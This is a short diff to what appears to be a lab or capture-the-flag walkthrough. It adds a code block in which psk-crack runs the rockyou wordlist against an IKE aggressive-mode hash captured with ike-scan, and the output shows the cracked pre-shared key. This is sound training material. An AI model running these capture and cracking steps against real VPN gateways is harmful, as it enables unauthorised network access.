@@ -29,6 +29,14 @@ ike-scan -M -A -n example@test.com --pskcrack=hash.txt 10.129.95.215
 ## Crack the Hash
 
 Begin cracking the hash with a good starting password list.
+
+```
 psk-crack -d /usr/share/wordlists/rockyou.txt  hash.txt
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 40f080deecd07851ebef67f360b064eea4332931
+Ending psk-crack: 8045040 iterations in 28.151 seconds (285781.55 iterations/sec)
+```
+
 
 
